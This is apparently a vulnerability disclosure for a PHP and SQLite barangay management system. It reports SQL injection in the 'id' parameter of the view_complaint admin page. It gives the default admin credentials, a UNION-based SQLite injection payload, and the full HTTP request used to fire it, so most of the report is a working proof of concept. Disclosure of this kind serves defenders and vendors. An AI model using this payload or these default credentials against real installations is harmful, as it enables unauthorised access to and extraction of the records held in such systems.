# Simple Barangay Management System v1.0 has SQL injection

BUG_AUTHOR: Weifei Hong

vendors: https://www.sourcecodester.com/php/14990/simple-barangay-management-system-php-and-sqlite-free-source-code.html

username&password = admin/admin123

Vulnerability File: /barangay_management/admin/?page=view_complaint

Vulnerability location: /barangay_management/admin/?page=view_complaint&id=,  id

[+] Payload: /barangay_management/admin/?page=view_complaint&id=1' union select 1,sqlite_version(),3,4,5,6--+

```sql
GET /barangay_management/admin/?page=view_complaint&id=1%27%20union%20select%201,sqlite_version(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=drqs3g29b8h07v6amt7rnb8t64
Connection: close


```

![image](https://github.com/user-attachments/assets/30589a37-c171-44ae-bcc2-3e9f19088aad)
